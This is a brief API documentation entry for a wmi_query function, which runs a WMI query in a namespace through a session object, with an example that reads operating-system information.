Executes a WMI query within the specified namespace to retrieve system information or perform administrative actions.

**Arguments**

- `sess` [Session] -  special session
- `namespace` [string] -  WMI namespace
- `args` [table<string>] -  WMI query arguments

**Example**

```
wmi_query(active(), "root\\cimv2", {"SELECT * FROM Win32_OperatingSystem"})
```

